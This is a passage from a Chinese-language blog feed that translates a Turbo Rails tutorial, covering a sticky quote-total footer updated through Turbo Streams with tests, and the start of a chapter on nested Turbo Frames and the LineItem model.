<li><p><strong>当我们只是在一个Turbo Stream view中指向一段DOM的id时，我们就不需要Turbo Frame了</strong>，比如我们在flash message时就不会使用Turbo Frame，相反我们使用含有flash id的<code>div</code>去加入新的message。我们也使用含有<code>quotes</code>id的<code>div</code>在<code>QUotes#index</code>页面，而不是Turbo Frame，因为<code>quotes</code>id只被用在Turbo Stream views中去添加quotesdao列表中，这并不需要拦截点击链接和表单提交。</p>
</li>
</ul>
<p>我个人的偏好是始终使用 Turbo Frame 标签，因为这样更容易看出该 ID 在 Turbo Stream 视图中被使用了。这也是为什么教程中到处使用Turbo Frames，然而当你不需要Turbo Frame时，如果你不同意我的观点或者更喜欢用<code>div</code>这也完全没问题</p>
<p>解释了这细微的不同，让我们继续教程</p>
<hr>
<h2 id="Designing-the-sticky-navbar"><a href="#Designing-the-sticky-navbar" class="headerlink" title="Designing the sticky navbar"></a>Designing the sticky navbar</h2><p>在使用Turbo之前，我们先到<code>Quotes#show</code>页面中加上<code>sticky navbar</code>并花点儿时间设计他。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在加上一个包含quote总价的局部视图标签</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/_total.html.erb %></span>

<span class="token operator">&lt;</span>footer <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"quote-total"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"quote-total__inner container"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span>div<span class="token operator">></span>Total<span class="token operator">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span> number_to_currency quote<span class="token punctuation">.</span>total_price <span class="token string-literal"><span class="token string">%>&lt;/div></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>footer<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们需要<code>#total_price</code>方法在<code>Quote</code>模型中，去展示quote的总价格</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous associations</span>
  has_many <span class="token symbol">:line_items</span><span class="token punctuation">,</span> <span class="token symbol">through</span><span class="token operator">:</span> <span class="token symbol">:line_item_dates</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">total_price</span></span>
    line_items<span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token symbol">:total_price</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到上面写的代码，quote的总价格是这个quote中每个line item的总价格之和，要确保在每个line item上实现了<code>#total_price</code>方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/line_item.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItem</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">total_price</span></span>
    quantity <span class="token operator">*</span> unit_price
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而每个line item的总价就是数量*单价，让我们很快的为刚刚实现的方法添加测试吧。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/models/line_item_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test_helper"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemTest</span> <span class="token operator">&lt;</span> ActiveSupport<span class="token double-colon punctuation">::</span>TestCase
  test <span class="token string-literal"><span class="token string">"#total_price returns the total price of the line item"</span></span> <span class="token keyword">do</span>
    assert_equal <span class="token number">250</span><span class="token punctuation">,</span> line_items<span class="token punctuation">(</span><span class="token symbol">:catering_today</span><span class="token punctuation">)</span><span class="token punctuation">.</span>total_price
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/models/quote_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test_helper"</span></span>

<span class="token keyword">class</span> <span class="token class-name">QuoteTest</span> <span class="token operator">&lt;</span> ActiveSupport<span class="token double-colon punctuation">::</span>TestCase
  test <span class="token string-literal"><span class="token string">"#total_price returns the sum of the total price of all line items"</span></span> <span class="token keyword">do</span>
    assert_equal <span class="token number">2500</span><span class="token punctuation">,</span> quotes<span class="token punctuation">(</span><span class="token symbol">:first</span><span class="token punctuation">)</span><span class="token punctuation">.</span>total_price
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再到浏览器中试试，我们应该可以在页面上看到quote的总价格，让我们再加点儿样式</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_quote_total.scss

.quote-total</span> <span class="token punctuation">&#123;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
  <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>

  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-xl<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--shadow-large<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
    <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">padding-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__inner</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>别忘了加到manifest file</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/quote_total"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>让我们在浏览器中进行测试，除了需要在我们的Quotes#show页面底部为最后一个line item date额外添加一些边距以防止与包含quote总额的sticky bar重叠之外，一切都应该按预期运行。让我们添加一个实用class以在需要时添加底部边距：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/utilities/_margins.scss

.mb-xxxxl</span> <span class="token punctuation">&#123;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxxxl<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">/</span><span class="token operator">/</span> app<span class="token operator">/</span>assets<span class="token operator">/</span>stylesheets<span class="token operator">/</span>application<span class="token punctuation">.</span>sass<span class="token punctuation">.</span>scss
<span class="token operator">/</span><span class="token operator">/</span> All the previous code

<span class="token operator">/</span><span class="token operator">/</span> Utilities
<span class="token variable">@import</span> <span class="token string-literal"><span class="token string">"utilities/margins"</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以在<code>Quotes#show</code>页面加上这个class</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container mb-xxxxl"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中试试吧，quote的总价格展示没问题了，但当我们创建，更改，删除line item时，并没有被更新，而当我们删除那些有多个line items的line item date时，也有同样的问题，我们将在下一章中使用Turbo Stream views去解决这些问题。</p>
<h2 id="Updating-our-view-with-Turbo-Streams"><a href="#Updating-our-view-with-Turbo-Streams" class="headerlink" title="Updating our view with Turbo Streams"></a>Updating our view with Turbo Streams</h2><p>如上面提到的，我们需要去更新quote总价，当：</p>
<ul>
<li>创建，修改，删除line item时</li>
<li>删除那些有多个line items的line item date时</li>
</ul>
<p>使用Turbo Streams去更新独立页面片段是很容易的，当每次我们执行下面操作时，让我们简单的重新渲染<code>quotes/_total.html.erb</code>局部模版。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_items/create.turbo_stream.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>

&lt;%= turbo_stream.update dom_id(@quote, :total) do %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_items/update.turbo_stream.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>

&lt;%= turbo_stream.update dom_id(@quote, :total) do %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_items/destroy.turbo_stream.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>

&lt;%= turbo_stream.update dom_id(@quote, :total) do %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_item_dates/destroy.turbo_stream.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>

&lt;%= turbo_stream.update dom_id(@quote, :total) do %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"quotes/total"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>也不要忘记去添加Turbo Frame tag或者一个<code>div</code>去嵌套包含总价的<code>sticky navbar</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container mb-xxxxl"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>main<span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag dom_id<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">,</span> <span class="token symbol">:total</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= render "quotes/total", quote: @quote %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去浏览器中试试吧</p>
<h2 id="Adding-system-tests-to-our-application"><a href="#Adding-system-tests-to-our-application" class="headerlink" title="Adding system tests to our application"></a>Adding system tests to our application</h2><p>别忘了加上系统测试，我们希望确保在创建，更新，删除line item时，quote的总价将被正确的更新。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/line_items_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemsTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  <span class="token comment"># All the previous code</span>

  test <span class="token string-literal"><span class="token string">"Creating a new line item"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># All the previous code</span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">.</span>total_price<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Updating a line item"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># All the previous code</span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">.</span>total_price<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Destroying a line item"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># All the previous code</span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">.</span>total_price<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们也要确保当含有line items的line item date被删除后，我们的quote总价也能被正确的更新。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/line_item_dates_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDatesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  <span class="token comment"># We must include this module to be able to use the</span>
  <span class="token comment"># `number_to_currency` method in our test</span>
  <span class="token keyword">include</span> ActionView<span class="token double-colon punctuation">::</span>Helpers<span class="token double-colon punctuation">::</span>NumberHelper

  <span class="token comment"># All the previous code</span>

  test <span class="token string-literal"><span class="token string">"Destroying a line item date"</span></span> <span class="token keyword">do</span>
    <span class="token comment"># All the previous code</span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">.</span>total_price<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们执行:<code>bin/rails test:all</code>指令时，应该都是绿色的。</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>这就是我们Turbo Rails教程的最后一章，其源自于我们曾做的真实项目，我希望你能愉快的读完，也希望你已经学习到大量的内容关于Turbo</p>
<p>如果你想部署你的应用到Heroku：<a href="https://www.youtube.com/watch?v=mpWFrUwAN88&t=1755s">YouTube demo by DHH with a timestamp to where he talks about deployment on Heroku</a></p>
<p>如果你想了解更多关于Hotwire and Turbo，我推荐看看<a href="https://github.com/thoughtbot/hotwire-example-template">hotwire-example-template</a>，仓库中所有的实例都很实用。</p>
<p>如果你享受这个教程，并且学习了很多内容，也可以直接在赞助[my Github profile（原作者），我将使用您的赞助维持网站，并可能在未来创建更多的教程。</p>
<p>欢迎与感兴趣的人分享本教程！</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第十章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E5%8D%81%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Nested-Turbo-Frames"><a href="#Nested-Turbo-Frames" class="headerlink" title="Nested Turbo Frames"></a>Nested Turbo Frames</h1><p>这一章，我们为line items构建最后的增删改查代码，而line items是嵌入到line items dates中的，为此我们需要使用Turbo Frames去解决一些有趣的挑战。</p>
<h2 id="What-we-will-build-in-this-chapter"><a href="#What-we-will-build-in-this-chapter" class="headerlink" title="What we will build in this chapter"></a>What we will build in this chapter</h2><p>本章中，我们会大致敲定quote编辑器，通过增加<strong>line item</strong>到<strong>line item date</strong>中，每一个<strong>line item</strong>都拥有名称，可选的描述，单价，数量。</p>
<p>这一章的的挑战是我们将会有大量的嵌套Turbo Frames，我们将讨论如何在操作<code>LineItemDate and LineItem</code>增删改查时，并<code>Quotes#show</code>页面的状态。</p>
<p>在敲代码前，我们在看一下线上的示例：<a href="https://www.hotrails.dev/quotes">final quote editor</a>，让我们创建一个quote并且进入对应的<code>Quotes#show</code>页面，让每位创建几个 <strong>line item dates and line items</strong>,来对我们最终的产品有一个确定的概念。</p>
<p>当我们清楚了最终产品的样子，我们就开始吧，我们会先不用Turbo Frames and Turbo Streams构建<code>LineItem</code>模型的增删改查，在后面Controller都正常运转时，再加入Turbo Rails的特征。</p>
<p>首先，画几个在没有<strong>Turbo Frames and Turbo Streams</strong>时，系统的行为的草图，当我们访问<code>Quotes#show</code>页面时，我们展示quote对应的<strong>line item date</strong>，而每个<strong>line item date</strong>都应有多个<strong>line item</strong>,每个<strong>line item date</strong>卡片都有一个”Add item”的链接，去创建专属这条<strong>Line item date</strong>的<strong>line item</strong></p>
<p><img src="../../../../public/img/image-20230628124247522.png" alt="image-20230628124247522"></p>
<p>在<code>Quotes#show</code>页面中，我们应该能为每个quote中的line item date添加line item，当点击”Add item”链接时，应该跳转到<code>LineItmes#new</code>页面，这里我们就可以添加该Line item date专属的line item。</p>
<p>假如我们点击第二条line item date的”Add item”链接时，我们期待的页面应该是这样的：</p>
<p><img src="../../../..../../../../public/img/image-20230628124716265.png" alt="image-20230628124716265"></p>
<p>当我们正常提交表单时，我们会重定向到<code>Quotes#show</code>页面，而新创的数据应该也被添加进去了。</p>
<p><img src="../../../../public/img/image-20230628124812981.png" alt="image-20230628124812981"></p>
<p>如果我们决定更新刚刚创建的line item，我们点击对应的”Edit”链接，到达<code>LineItems#edit</code>页面。</p>
<p><img src="../../../../public/img/image-20230628125022440.png" alt="image-20230628125022440"></p>
<p>如果我们提交表单，将再被重定向到<code>Quotes#show</code>页面，并且数据被更新</p>
<p><img src="../../../../public/img/image-20230628125111148.png" alt="image-20230628125111148"></p>
<p>最后当想删除这条line item，点击”Delete”，则数据就被删除了。</p>
<p>需求已经理清楚了，开始敲代码吧。</p>
<h2 id="Creating-the-model"><a href="#Creating-the-model" class="headerlink" title="Creating the model"></a>Creating the model</h2><p>让我们创建<code>LineItme</code>模型，这个模型有五个字段：</p>
<ul>
<li>line item date的引用</li>
<li>名称</li>
<li>可选描述</li>
<li>单价</li>
<li>数量</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails generate model LineItem <span class="token punctuation">\</span>
  line_item_date:references <span class="token punctuation">\</span>
  name:string <span class="token punctuation">\</span>
  description:text <span class="token punctuation">\</span>
  quantity:integer <span class="token punctuation">\</span>
  unit_price:decimal<span class="token punctuation">&#123;</span><span class="token number">10</span>-2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行<code>rails db:migrate</code>指令前，我们必须对<code>name,quantity</code>添加约束，并且单价肯定非空，通过<code>null: false</code>可以在数据库层面进行控制，最终的迁移文件：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># db/migrate/XXXXXXXXXXXXXX_create_line_items.rb</span>

<span class="token keyword">class</span> <span class="token class-name">CreateLineItems</span> <span class="token operator">&lt;</span> ActiveRecord<span class="token double-colon punctuation">::</span>Migration<span class="token punctuation">[</span><span class="token number">7.0</span><span class="token punctuation">]</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">change</span></span>
    create_table <span class="token symbol">:line_items</span> <span class="token keyword">do</span> <span class="token operator">|</span>t<span class="token operator">|</span>
      t<span class="token punctuation">.</span>references <span class="token symbol">:line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token symbol">foreign_key</span><span class="token operator">:</span> <span class="token boolean">true</span>
      t<span class="token punctuation">.</span>string <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>
      t<span class="token punctuation">.</span>text <span class="token symbol">:description</span>
      t<span class="token punctuation">.</span>integer <span class="token symbol">:quantity</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>
      t<span class="token punctuation">.</span>decimal <span class="token symbol">:unit_price</span><span class="token punctuation">,</span> <span class="token symbol">precision</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token symbol">scale</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token symbol">null</span><span class="token operator">:</span> <span class="token boolean">false</span>

      t<span class="token punctuation">.</span>timestamps
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在再执行迁移指令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/rails db:migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再到模型中添加对应的关系与校验</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/line_item.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItem</span> <span class="token operator">&lt;</span> ApplicationRecord
  belongs_to <span class="token symbol">:line_item_date</span>

  validates <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span>
  validates <span class="token symbol">:quantity</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token symbol">numericality</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">only_integer</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token symbol">greater_than</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span>
  validates <span class="token symbol">:unit_price</span><span class="token punctuation">,</span> <span class="token symbol">presence</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token symbol">numericality</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">greater_than</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span>

  delegate <span class="token symbol">:quote</span><span class="token punctuation">,</span> <span class="token symbol">to</span><span class="token operator">:</span> <span class="token symbol">:line_item_date</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的校验强制操作：</p>
<ul>
<li>名称，数量，单价不为空</li>
<li>单价和数量必须大于0</li>
<li>数量必须是数字</li>
</ul>
<p>我们将委托<code>quote</code>方法给<code>LineItem#line_item_date</code>方法，这样下面的两个代码是一致的。</p>
<pre class="line-numbers language-none"><code class="language-none">line_item.line_item_date.quote
line_item.quote<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>现在<code>LineItem</code>模型已经好了，再到<code>LineItemDate</code>中增加关联关系</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/line_item_date.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDate</span> <span class="token operator">&lt;</span> ApplicationRecord
  has_many <span class="token symbol">:line_items</span><span class="token punctuation">,</span> <span class="token symbol">dependent</span><span class="token operator">:</span> <span class="token symbol">:destroy</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>模型层就都可以了，下面开始搞路由部分。</p>
<h2 id="Adding-routes-for-line-items"><a href="#Adding-routes-for-line-items" class="headerlink" title="Adding routes for line items"></a>Adding routes for line items</h2><p>我们想要执行<code>LineItem</code>模型中七个增删改查行为，除了下面两个</p>
<ul>
